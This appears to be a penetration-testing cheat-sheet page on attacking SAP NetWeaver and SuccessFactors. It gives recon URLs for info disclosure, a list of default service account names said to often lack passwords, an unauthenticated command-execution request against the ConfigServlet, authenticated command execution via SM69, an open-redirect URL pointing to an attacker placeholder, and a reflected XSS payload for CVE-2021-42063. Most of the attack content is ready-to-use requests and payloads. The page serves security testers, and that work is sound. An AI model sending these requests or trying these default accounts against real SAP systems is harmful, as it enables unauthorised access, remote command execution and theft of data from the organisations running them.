---
tags:
  - Web
---

# :material-factory: SAP

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

SAP NetWeaver (ABAP + J2EE) exposes a large web surface (`/sap/public/*`, ICF
services, the CTC config servlet) plus a well-known set of **default service
accounts**. Misconfiguration and legacy compatibility are the usual way in — from
info disclosure to unauthenticated RCE.

!!! abstract "TL;DR"
    Hit `/sap/public/info` for system info → check default NetWeaver service users →
    test the `ConfigServlet` for unauth command execution → `SM69` for authenticated
    RCE. SuccessFactors = OData surface.

## :material-magnify: Recon & info disclosure

```text
http://$TARGET:PORT/sap/public/info          # juicy system/version info (SOAP)
http://$TARGET:PORT/sap/public/info          # also plain info disclosure check
http://$TARGET:PORT/startPage                # reachable over plain HTTP? = weak transport
```

!!! loot "NetWeaver default service users (often no password set)"
    ```text
    ume_service          uwl_service           pcd_service
    subscription_service timebasedpublish_service  notificator_service
    index_service        ice_service           config_fwk_service
    collaboration_service cmadmin_service      caf_gp_svcuser
    action_inbox_service administrator
    ```
    Also test **TMSADM** (known/derivable default password) and unused clients
    `001` / `066`.

## :material-fire: RCE — ConfigServlet

The J2EE `ConfigServlet` allows unauthenticated OS command execution when exposed:

```text
/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=ls
```

If it runs `ls`, you have unauth RCE. See the ERPScan "Breaking SAP Portal" research.

!!! bug "Authenticated RCE via SM69"
    Com uma sessão válida, a transação **SM69** permite criar um *external command* —
    execução de comandos no SO do servidor.

## :material-link-off: Web interface checks

```text
# Open redirect via the ICF logoff service
https://$TARGET/sap/public/bc/icf/logoff?redirecturl=<ATTACKER>

# Reflected XSS — CVE-2021-42063 (SAP Knowledge Warehouse / SAPIrExtHelp)
https://$TARGET/SAPIrExtHelp/random/<url-encoded "><svg onload=alert(document.domain)>.asp
```

## :material-database: SuccessFactors / OData

SuccessFactors exposes an **OData** API — enumerate entity sets and test for
over-permissive queries / injection against the OData endpoints.

## :material-link-variant: Related

- Often deployed behind [SAP-context OutSystems](outsystems.md); fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Primitives: [Open Redirect](../web/open-redirect.md), [XSS](../web/xss.md), [Command Injection](../web/command-injection.md).
- Reference: [BIZEC TEC11](https://web.archive.org/web/2019*/bizec.org), [Onapsis / ERPScan SAP research](https://web.archive.org/web/2022*/erpscan.io).
